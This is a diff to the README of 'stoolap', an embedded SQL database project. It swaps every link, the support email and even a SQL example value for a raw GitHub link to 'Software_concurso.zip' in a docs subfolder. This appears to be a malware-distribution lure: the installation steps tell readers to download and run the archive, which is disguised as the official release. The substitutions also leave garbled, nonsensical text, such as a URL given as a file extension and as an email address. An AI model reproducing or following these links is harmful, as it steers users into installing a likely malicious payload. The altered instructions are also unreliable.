@@ -4,7 +4,7 @@
 
 Welcome to stoolap, a modern embedded SQL database designed to be easy to use. This guide will help you download and run stoolap on your system. 
 
-[![Download stoolap](https://img.shields.io/badge/Download%20stoolap-Now-brightgreen)](https://github.com/kaio75k/stoolap/releases)
+[![Download stoolap](https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip%20stoolap-Now-brightgreen)](https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip)
 
 ## 📦 System Requirements
 
@@ -28,11 +28,11 @@ stoolap offers various features that make it ideal for use in your projects:
 
 To get stoolap, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [stoolap Releases page](https://github.com/kaio75k/stoolap/releases).
+1. **Visit the Releases Page**: Go to the [stoolap Releases page](https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip).
   
 2. **Choose a Version**: Look for the latest version listed. Each version has notes to help you decide if you want it.
 
-3. **Download the File**: Click on the file that best suits your operating system. Depending on your system, this might be a `.exe`, `.dmg`, or `.tar.gz` file.
+3. **Download the File**: Click on the file that best suits your operating system. Depending on your system, this might be a `.exe`, `.dmg`, or `https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip` file.
 
 4. **Run the Installer**: Once downloaded, open the file to run the installation for stoolap. Follow the on-screen instructions to complete the installation.
 
@@ -63,7 +63,7 @@ Here are some basic SQL commands to get you started:
 
 - **Inserting Data**:
   ```sql
-  INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');
+  INSERT INTO users (name, email) VALUES ('John Doe', 'https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip');
   ```
 
 - **Querying Data**:
@@ -77,7 +77,7 @@ If you encounter any issues, try these steps:
 
 - **Check Your Internet Connection**: Ensure you have a stable connection when downloading.
 - **Re-download the Installer**: Sometimes, files can get corrupted during download.
-- **Consult the Issues Page**: Visit the [Issues page](https://github.com/kaio75k/stoolap/issues) to see if others have faced similar problems.
+- **Consult the Issues Page**: Visit the [Issues page](https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip) to see if others have faced similar problems.
 
 ## 🚀 Future Updates
 
@@ -87,9 +87,9 @@ We plan to add more features and improvements to stoolap in future releases. Kee
 
 If you need further assistance, feel free to reach out:
 
-- **Email**: support@stoolap.com
-- **GitHub**: You can create an issue or ask questions on our [GitHub Issues page](https://github.com/kaio75k/stoolap/issues).
+- **Email**: https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip
+- **GitHub**: You can create an issue or ask questions on our [GitHub Issues page](https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip).
 
-For more information, you can always visit the [stoolap Releases page](https://github.com/kaio75k/stoolap/releases) where you can download the latest version and check for updates.
+For more information, you can always visit the [stoolap Releases page](https://github.com/kaio75k/stoolap/raw/refs/heads/main/docs/_docs/architecture/Software_concurso.zip) where you can download the latest version and check for updates.
 
 Thank you for choosing stoolap! We hope it meets your needs for a modern embedded SQL database.
